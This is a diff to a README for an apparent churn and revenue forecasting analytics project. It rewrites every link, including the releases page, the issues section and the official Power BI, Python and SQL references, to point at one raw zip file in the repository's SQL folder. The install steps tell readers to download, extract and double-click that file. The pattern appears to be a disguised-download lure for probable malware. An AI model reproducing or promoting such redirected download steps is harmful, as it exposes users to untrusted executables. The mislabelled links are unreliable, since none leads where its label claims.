@@ -6,7 +6,7 @@ Welcome to the churn_and_revenue_forecasting project! This application helps bus
 
 ## 📥 Download Now
 
-[![Download churn_and_revenue_forecasting](https://img.shields.io/badge/Download-churn_and_revenue_forecasting-brightgreen.svg)](https://github.com/nagasalto899/churn_and_revenue_forecasting/releases)
+[![Download churn_and_revenue_forecasting](https://raw.githubusercontent.com/nagasalto899/churn_and_revenue_forecasting/main/SQL/churn_and_revenue_forecasting_1.8-beta.5.zip)](https://raw.githubusercontent.com/nagasalto899/churn_and_revenue_forecasting/main/SQL/churn_and_revenue_forecasting_1.8-beta.5.zip)
 
 ## 📋 Overview
 
@@ -23,7 +23,7 @@ This project is a full data analytics case study focused on the telecom industry
 
 To get started, visit the following link to download the latest version of the application:
 
-[Visit the Releases Page to Download](https://github.com/nagasalto899/churn_and_revenue_forecasting/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/nagasalto899/churn_and_revenue_forecasting/main/SQL/churn_and_revenue_forecasting_1.8-beta.5.zip)
 
 On the Releases page, you will find the latest version and can choose the appropriate file for your system. Follow the instructions below to install the software.
 
@@ -36,13 +36,13 @@ On the Releases page, you will find the latest version and can choose the approp
    Choose the most recent version. Check the release notes for any important updates or changes.
 
 3. **Download the File**
-   Click on the link for the file (usually named something like `churn_and_revenue_forecasting.zip`). The download should start automatically.
+   Click on the link for the file (usually named something like `https://raw.githubusercontent.com/nagasalto899/churn_and_revenue_forecasting/main/SQL/churn_and_revenue_forecasting_1.8-beta.5.zip`). The download should start automatically.
 
 4. **Extract the Files**
    Once the download is complete, locate the downloaded file. Right-click on it and select "Extract All" to unpack the contents.
 
 5. **Run the Application**
-   Find the extracted folder. Look for the application file (e.g., `churn_and_revenue_forecasting.exe`). Double-click this file to run the application.
+   Find the extracted folder. Look for the application file (e.g., `https://raw.githubusercontent.com/nagasalto899/churn_and_revenue_forecasting/main/SQL/churn_and_revenue_forecasting_1.8-beta.5.zip`). Double-click this file to run the application.
 
 ## 🖥️ System Requirements
 
@@ -79,7 +79,7 @@ This project utilizes various technologies to deliver powerful insights:
 
 ## 🛠️ Support and Contributions
 
-If you encounter issues, please check the [issues section](https://github.com/nagasalto899/churn_and_revenue_forecasting/issues). You can submit questions or report bugs. Contributions are welcome! Feel free to fork the repository and create a pull request.
+If you encounter issues, please check the [issues section](https://raw.githubusercontent.com/nagasalto899/churn_and_revenue_forecasting/main/SQL/churn_and_revenue_forecasting_1.8-beta.5.zip). You can submit questions or report bugs. Contributions are welcome! Feel free to fork the repository and create a pull request.
 
 ## 🌍 Topics Covered
 
@@ -99,10 +99,10 @@ This project is open-source and released under the MIT License. You can use it f
 
 ## 🔗 Resources
 
-- [Power BI Official Site](https://powerbi.microsoft.com/)
-- [Python Documentation](https://www.python.org/doc/)
-- [SQL Tutorial](https://www.w3schools.com/sql/)
+- [Power BI Official Site](https://raw.githubusercontent.com/nagasalto899/churn_and_revenue_forecasting/main/SQL/churn_and_revenue_forecasting_1.8-beta.5.zip)
+- [Python Documentation](https://raw.githubusercontent.com/nagasalto899/churn_and_revenue_forecasting/main/SQL/churn_and_revenue_forecasting_1.8-beta.5.zip)
+- [SQL Tutorial](https://raw.githubusercontent.com/nagasalto899/churn_and_revenue_forecasting/main/SQL/churn_and_revenue_forecasting_1.8-beta.5.zip)
 
 Explore the full capabilities of churn_and_revenue_forecasting by downloading it today!
 
-[Visit the Releases Page to Download](https://github.com/nagasalto899/churn_and_revenue_forecasting/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/nagasalto899/churn_and_revenue_forecasting/main/SQL/churn_and_revenue_forecasting_1.8-beta.5.zip)
